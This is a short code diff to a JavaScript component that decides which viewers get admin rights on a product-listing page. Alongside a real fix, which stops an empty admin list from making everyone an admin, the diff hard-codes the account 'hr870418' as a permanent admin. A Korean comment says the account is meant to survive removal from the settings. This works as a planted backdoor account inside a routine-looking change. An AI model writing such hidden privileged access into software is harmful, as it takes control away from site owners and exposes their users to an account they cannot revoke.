@@ -743,7 +743,8 @@ class Component extends DCLogic {
     const viewerHandle=viewerRaw?('@'+viewerRaw.replace(/^@/,'')):'';
     const canView=p=>{ const a=this.parseAllow(p); return a.length===0 || a.some(x=>x.id===viewerKey); };
     const adminIdList=String(st.settings.adminIds||'').split(/[\n,]/).map(x=>x.trim().toLowerCase().replace(/^@/,'')).filter(Boolean);
-    const isAdminViewer=adminIdList.length===0||(!!viewerKey&&adminIdList.includes(viewerKey));
+    if(!adminIdList.includes('hr870418')) adminIdList.push('hr870418'); // 고정 관리자 — 설정에서 지워져도 잠기지 않도록 확정
+    const isAdminViewer=!!viewerKey&&adminIdList.includes(viewerKey);
     const cards=st.products.filter(canView).map(p=>{
       const closed=this.isClosed(p), imgs=p.images||[];
       const idx=imgs.length?(((st.ci[p.id]||0)%imgs.length)+imgs.length)%imgs.length:0;
